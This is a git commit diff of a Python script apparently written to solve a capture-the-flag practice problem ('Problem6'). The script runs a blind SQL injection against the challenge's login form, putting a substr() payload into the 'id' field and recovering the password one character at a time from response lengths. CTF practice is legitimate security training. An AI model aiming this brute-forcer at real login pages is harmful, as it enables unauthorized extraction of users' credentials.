94251ccbc59c41095c4087772c3c0821d228e7e3
Ryoma Yamada <ryoma.yamada30@gmail.com>
2018-06-07 14:16:22 +0900

    login

--- Problem6/login.py
+++ Problem6/login.py
@@ -1,20 +1,31 @@
 #!/usr/bin/env python
 #coding: utf-8
 
-import urllib
-import urllib2
+import urllib.request
+import urllib.parse
 
-url = "http://ctfq.sweetduet.info:10080/~q6/"
-params = {"id":0, "param" : "dammy" }
-params = urllib.urlencode(params)
+#パスワード候補文字列
+charset = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_'
 
-req = urllib2.Request(url)
-# ヘッダ設定
-req.add_header('test', 'application/x-www-form-urlencoded')
-# パラメータ設定
-req.add_data(params)
+flag = ''
 
+#先頭から順にflag文字列を探していく
+for str_pos in range(21):
+    for pw in charset:
+        
+        #POSTのペイロード
+        payload = {'id':'admin\' and substr(pass,'+str(str_pos) +',1) = \''+pw+'\'--', 'pass': ''}
+        
+        #utf-8でエンコードしてリクエスト
+        post_data = urllib.parse.urlencode(payload).encode('utf-8')
+        url = "http://ctfq.sweetduet.info:10080/~q6/"
+        req = urllib.request.Request(url, post_data)
 
-res = urllib2.urlopen(req)
-r = res.read()
-print r
+        #HTTPレスポンス
+        res = urllib.request.urlopen(req)
+
+        #content-lengthが大きかったら正しい文字
+        if(int(res.headers['content-length']) > 1000):
+            flag += pw
+            print(str(str_pos) + ':' + flag)
+            break
